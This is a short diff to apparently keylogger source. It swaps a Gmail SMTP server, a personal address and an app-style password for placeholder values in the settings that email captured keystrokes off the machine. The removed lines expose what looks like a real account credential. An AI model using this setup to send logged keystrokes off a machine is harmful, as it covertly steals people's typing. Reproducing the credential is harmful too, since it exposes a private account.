@@ -9,11 +9,11 @@ import time
 import os
 
 # Email configuration
-SMTP_SERVER = 'smtp.gmail.com'
+SMTP_SERVER = 'smtp.your_email_provider.com'
 SMTP_PORT = 587
-USERNAME = 'sushanshetty1470@gmail.com'
-PASSWORD = 'xxgpcamappvlxxxy'
-TO_EMAIL = 'sushanshetty1470@gmail.com'
+USERNAME = 'your_email@example.com'
+PASSWORD = 'your_email_password'
+TO_EMAIL = 'reciever_email@example.com'
 
 log_file = "keylogger.json"
 
